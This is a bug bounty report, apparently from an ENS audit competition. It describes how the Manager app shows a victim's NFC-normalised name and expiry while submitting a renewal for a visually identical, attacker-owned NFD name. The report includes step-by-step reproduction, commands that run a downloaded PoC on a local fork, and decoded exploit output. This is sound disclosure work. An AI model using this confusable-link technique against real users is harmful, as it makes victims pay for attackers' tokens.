# 91681 w a critical manager displays the victim s nfc expiry but renews an attacker owned raw nfd ens token

**Submitted on Sep 3rd 2026 at 14:37:20 UTC by @shadowHunter for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91681
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/packages/transaction-manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Description

Manager sends the renewal route parameter through two inconsistent identity pipelines:

1. The displayed expiry goes through `profileExpiryQuery(name)`, then `normalizeEth2LdName(name)`, then ENS `normalize(name)`. A raw NFD URL is therefore queried as its visually identical NFC name.
2. The submitted label comes from `parsedName.value.label`. That parser only trims and lowercases. `renewalUi.machine.ts` preserves it, and `registration.actors.ts` removes only the literal `.eth` suffix before ABI-encoding `renew(...)`.

For this run, the victim owned `caf\u00e9-ens05-fc3e71fb.eth` while the attacker owned the visually identical raw spelling `cafe\u0301-ens05-fc3e71fb.eth`. Their exact labelhashes, token IDs, owners, and expiries were deliberately different. Manager displayed `January 1, 2028`, derived from the victim token; the corresponding raw-token date would have been `October 8, 2027`. Nevertheless, the mined calldata contained the raw NFD label and raw labelhash.

### Affected flow at audited commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`

```
apps/manager/src/routes/renew/$name.tsx:27
  profileExpiryQuery(name)

apps/manager/src/features/profile/service/profileExpiry.ts:77
  const ethName = normalizeEth2LdName(name)

apps/manager/src/features/profile/service/profileName.ts:18
  normalized = normalize(name)

apps/manager/src/routes/renew/$name.tsx:61
  label: parsedName.value.label

apps/manager/src/features/renew/state/renewalUi.machine.ts:151,349
  raw parsed label is retained and submitted

packages/transaction-manager/src/machines/registration/registration.actors.ts:1025,1029
  const cleanLabel = label.replace('.eth', '')
  args: [cleanLabel, duration, paymentToken, REFERER_ADDRESS]
```

## Impact

A crafted link causes a connected victim to pay to extend an ENS token owned by the attacker while Manager presents the visually identical victim name and expiry-derived date. This is not merely a constructed request or cosmetic confusable: V's status-1 transaction transferred USDC and the attacker token's expiry increased on-chain. The transaction is valid because renewal is permissionless; the security defect is that Manager binds its displayed details and signed calldata to different exact labels.

The reproduced victim loss was `8005501` USDC base units (`8.005501` USDC). The attacker gained a one-year extension (`31557600` seconds) for their token. A victim choosing a longer period would pay proportionally more.

## Recommendation

Normalize once at the route trust boundary and carry one typed `NormalizedName`/`NormalizedLabel` through every query, cache key, quote, UI string, state-machine event, and transaction argument. Prefer redirecting a non-canonical route to its canonical URL before rendering.

Immediately before requesting a signature, recompute and compare the exact labelhash/token ID used to obtain the displayed expiry with the exact labelhash/token ID encoded into `renew`. Fail closed on any mismatch. Add an end-to-end regression containing NFC/NFD labels owned by different accounts and with different expiries.

## Proof of Concept

## Proof of Concept

No attacker access to the victim wallet, browser storage, private key, or authenticated backend session is required.

1. Create distinct victim V and attacker A accounts.
2. Register the canonical NFC name `caf\u00e9-ens05-fc3e71fb.eth` to V for a long duration.
3. Register the byte-distinct raw NFD name `cafe\u0301-ens05-fc3e71fb.eth` to A for a shorter duration. Confirm the two exact labelhashes and token IDs differ.
4. Reset V's registrar USDC allowance to zero so Manager must request a real approval.
5. Open Manager at the URL-encoded raw NFD route and connect only V's wallet.
6. Observe that the raw route displays `January 1, 2028`, the same date as the canonical route. Exact raw state instead implies `October 8, 2027` for the chosen one-year renewal.
7. Click **Pay with stablecoins**, choose USDC, and click **Renew Name**.
8. Pause with the USDC approval wallet request pending. Confirm no block was mined before V authorizes it, then authorize it.
9. Pause again with the separate renewal request pending. Confirm no renewal block was mined before V authorizes it, then authorize it.
10. Decode the two mined transactions. The second calls `renew` with raw label `cafe\u0301-ens05-fc3e71fb`, labelhash `0x1682e4bea9b1e8bcba4df11bf07a2eb85e07b52e8400739a20e807247b202c36`, duration `31557600`, and USDC `0x768F42455A2D082E23ceeF7d51e5787C82d67a39`.
11. Read exact registrar state after mining. The attacker still owns the raw token and its expiry changes from `1791453144` to `1823010744`; V still owns the canonical token and its expiry remains `1798797141`.
12. Compare balances and the `NameRenewed` event. V pays `8005501` USDC base units, exactly the event amount. A's USDC and native balances do not change.

The inline harness attached performs all twelve steps using the real audited Manager UI, a victim-only headless wallet, real commit/register/approve/renew transactions, exact on-chain state reads, and strict assertions.

## Complete runnable Coded PoC bundle

Coded POC: [**DOWNLOAD `ENS-05.zip`**](https://drive.google.com/file/d/1VpeBBFuAaCqb8b9eYPPoNzZOlzsTrlre/view?usp=sharing)

```
Archive: ens-05.zip
Successful retained run: r4-20260903T111500Z
```

The linked archive is the complete, untruncated PoC—not a source excerpt. It contains the runnable setup, Docker/Anvil/Panoptes configuration, real Manager Playwright test, one-command runner, full generated report, raw transactions and receipts, decoded calldata, before/after state, screenshots, video, Playwright trace, browser evidence, secret-scan result, and a recursively verifiable SHA-256 evidence manifest. No source file required by the runner is omitted.

The form's image uploads are only supplementary UI evidence. The runnable code and machine-readable evidence are in the linked archive.

## Safety and revision

This PoC does not send transactions to public Sepolia or mainnet. Anvil reads Sepolia state at fixed block `11625819`, but every setup, approval, and renewal transaction is signed and mined only by local Anvil at `127.0.0.1:8545`. Manager runs on `127.0.0.1:3000`, and the indexer is reachable only through a loopback relay. The browser is blocked from non-loopback HTTP/WebSocket destinations and receives only the disposable victim key.

## Archive map

The important entry points are:

```
audit-pocs/ens-05/
  README.md
  report.md
  src/setup.ts
  tests/ens-05.manager.spec.ts
  tests/playwright.config.ts
  panoptes/contracts.fork-11625819.json
  scripts/run.sh
  scripts/docker-compose.fork-11625819.yml
  scripts/docker-compose.loopback.yml
  scripts/assert-local-only.sh
  scripts/verify-panoptes-labels.sh
  artifacts/runs/r4-20260903T111500Z/
    environment/run-status.txt
    indexer/label-preservation-proof.json
    ui/preauthorization-pending-state.json
    ui/approval-transaction.json
    ui/approval-receipt.json
    ui/renewal-transaction.json
    ui/renewal-receipt.json
    ui/decoded-and-state-delta.json
    ui/renewal-trace.json
    ui/browser-evidence.json
    ui/*.png
    ui/ens-05-trace.zip
    manifest/SHA256SUMS
```

`src/setup.ts` creates the exact byte-distinct names with real local commit/register transactions. `tests/ens-05.manager.spec.ts` drives the unmodified Manager UI with only the victim account, pauses for and authorizes the two wallet requests, decodes both mined transactions, and asserts ownership, expiry, and USDC state changes. Panoptes responses are not mocked or intercepted.

## Prerequisites

* WSL2 Ubuntu on x86-64
* Git, Node.js 22, Corepack/pnpm, Docker Engine with Compose, Python 3, `curl`, `jq`, `unzip`, `openssl`, `realpath`, `sha256sum`, and `timeout`
* Enough space for two Linux-native checkouts and the pinned Docker images
* A read-only Sepolia archive RPC capable of serving block `11625819`; the credentialless endpoint below is the source used by the retained run

The retained successful environment used Node `v22.23.2`, pnpm `10.27.0`, Playwright `1.58.2`, Docker `29.1.3`, and Docker Compose `2.40.3`.

## Exact reproduction commands

Run the following in WSL Ubuntu. Set `POC_ARCHIVE` to the downloaded archive. Both keys are newly generated disposable keys used only on local Anvil.

```bash
export POC_ARCHIVE='/path/to/ens-05.zip'
export BUNDLE_ROOT='/root/ens5-poc-bundle'
export REPO_ROOT='/root/ens5-poc-exec'
export EXTRACT_ROOT="$(mktemp -d)"

test "$(sha256sum "$POC_ARCHIVE" | cut -d ' ' -f 1)" = \
  '73569962cb4468476105252fd1f8d68f34de3f21df16c6da63c9fc75b9b62116'
unzip -q "$POC_ARCHIVE" -d "$EXTRACT_ROOT"

git clone --branch audit-comp-ready \
  https://github.com/immunefi-team/audit-comp-ens.git "$BUNDLE_ROOT"
git -C "$BUNDLE_ROOT" checkout --detach \
  1c9b47f18fcddd2e864dfe385c4171061c9811ae
test "$(git -C "$BUNDLE_ROOT" rev-parse HEAD)" = \
  '1c9b47f18fcddd2e864dfe385c4171061c9811ae'

git clone --branch audit-comp-ready \
  https://github.com/immunefi-team/audit-comp-ens.git "$REPO_ROOT"
git -C "$REPO_ROOT" checkout --detach \
  1c9b47f18fcddd2e864dfe385c4171061c9811ae
test "$(git -C "$REPO_ROOT" rev-parse HEAD)" = \
  '1c9b47f18fcddd2e864dfe385c4171061c9811ae'

mkdir -p "$BUNDLE_ROOT/audit-pocs" "$REPO_ROOT/audit-pocs"
cp -a "$EXTRACT_ROOT/audit-pocs/ens-05" "$BUNDLE_ROOT/audit-pocs/"
cp -a "$BUNDLE_ROOT/audit-pocs/ens-05" "$REPO_ROOT/audit-pocs/"

corepack pnpm --dir "$REPO_ROOT" install --frozen-lockfile
corepack pnpm --dir "$REPO_ROOT/e2e" exec playwright install chromium
docker pull \
  ghcr.io/foundry-rs/foundry@sha256:8347b728d5d393dac1c018691b36f506d23b9dcd78341d40ea0fcb11c3a19cdd
docker pull \
  ghcr.io/mdtanrikulu/panoptes@sha256:a5fd2896ddb9e8117ca2d781e09042afea2b56b96a4a52935e79c9c994b24b2b

export ENS05_EXECUTION_REPO="$REPO_ROOT"
export SEPOLIA_FORK_URL='https://sepolia.gateway.tenderly.co'
export VICTIM_PRIVATE_KEY="0x$(openssl rand -hex 32)"
export ATTACKER_PRIVATE_KEY="0x$(openssl rand -hex 32)"
export ENS05_RUN_ID='triager-reproduction-01'

cd "$BUNDLE_ROOT/audit-pocs/ens-05"
bash ./scripts/run.sh
```

`SEPOLIA_FORK_URL` is only a read-only state source for the local fork. It is never passed to Manager/the browser and never receives a signed transaction. A different read-only archive endpoint can be substituted. Do not use funded or production keys.

The runner fails closed unless RPC, Manager, and indexer endpoints are loopback, `web3_clientVersion` identifies Anvil, the chain ID is `11155111`, both checkouts are at the expected commit, and the execution-side PoC files byte-match the archive. It also fails if either wallet request is mined before explicit victim authorization or any final exploit assertion is false.

## Expected terminal result

The unique suffix and transaction hashes change on a fresh reproduction. Success ends with:

```
[ENS-05] Loopback URL policy passed.
[ENS-05] Safety gate passed: loopback Anvil, local Sepolia chain id.
[ENS-05] Registering the exact NFC/NFD pair with real local transactions.
[ENS-05] Panoptes preserved the exact NFD/NFC pair.
[ENS-05] Manager ready: http://127.0.0.1:3000
[ENS-05] Running victim-only Manager flow with two explicit authorizations.

Running 1 test using 1 worker
  1 passed

[ENS-05] Captured after chain state.
[ENS-05] PoC passed and evidence was sealed: <new run directory>
```

## Decisive output from retained successful run r4

All hashes below are local-Anvil transaction hashes and therefore are verified from the included raw transactions, receipts, trace, and post-state—not from a public block explorer.

```
Victim V:   0xEFC24B19988Bc6fc0508d793D5550A1542D1C075
Attacker A: 0x6c3678482384e908a645E25B790571Bc7769cA7a

Victim NFC name: caf\u00e9-ens05-fc3e71fb.eth
Attacker raw NFD name: cafe\u0301-ens05-fc3e71fb.eth
Raw full-name UTF-8: 0x63616665cc812d656e7330352d66633365373166622e657468
Canonical labelhash: 0x159a3ebff5bcdf4b7b7318cb046473455694d301653702ee91d0d1e3d079119c
Raw labelhash:       0x1682e4bea9b1e8bcba4df11bf07a2eb85e07b52e8400739a20e807247b202c36
Exact names distinct: true
Exact labelhashes/token IDs distinct: true

Manager date on canonical route: January 1, 2028
Manager date on crafted raw route: January 1, 2028
Date implied by exact raw-token state: October 8, 2027

Browser-exposed accounts: [V]
Attacker key available to browser: false

Approval pending at block: 11625831
Block while approval pending: 11625831
Mined before victim authorization: false
Approval tx: 0x8e37ef04cf25af55a77423efc13e6102d53ee6c96cf45fef004b92ce50acf6b0
Approval receipt status: 1

Renewal pending after approval block: 11625832
Block while renewal pending: 11625832
Mined before victim authorization: false
Renewal tx: 0x1b033ac8c159437491bb50238b5b775950bcee3a30d536bf4d82bad3b140d9c9
Renewal from: V
Renewal to: 0xa88553F454b77203B0D036A05c894d555EAAa2Cc
Renewal receipt status: 1

Decoded function: renew
Decoded exact label: cafe\u0301-ens05-fc3e71fb
Decoded label UTF-8: 0x63616665cc812d656e7330352d6663336537316662
Decoded duration: 31557600
Decoded payment token: 0x768F42455A2D082E23ceeF7d51e5787C82d67a39

Canonical owner before/after: V / V
Canonical expiry before/after: 1798797141 / 1798797141
Raw owner before/after: A / A
Raw expiry before/after: 1791453144 / 1823010744
Raw expiry delta: +31557600
NameRenewed token ID: 10182151525680950377161250642149321438673398224857173921084545283295606210560
NameRenewed amount: 8005501
Victim USDC balance: 9997369856 -> 9989364355
Victim USDC paid: 8005501
Attacker USDC delta: 0

Playwright: 1 passed (1.6m)
Runner exit status: 0
Retained-evidence secret scan: passed, 0 findings
```

The victim signed and mined a real local renewal whose calldata selected the byte-distinct attacker-owned raw token. The victim's canonical token did not change, the attacker's raw token gained exactly one year, and the victim paid exactly the amount emitted by `NameRenewed`.

## Verify the retained evidence independently

After extraction, verify every retained evidence file against the sealed recursive manifest:

```bash
cd "$BUNDLE_ROOT/audit-pocs/ens-05"
bash ./scripts/generate-manifest.sh --verify \
  ./artifacts/runs/r4-20260903T111500Z
```

The expected result is one `OK` line per retained file and exit status `0`. The run status is:

```
exit_status=0
secret_scan_exit_status=0
completed_utc=2026-09-03T11:11:52Z
```
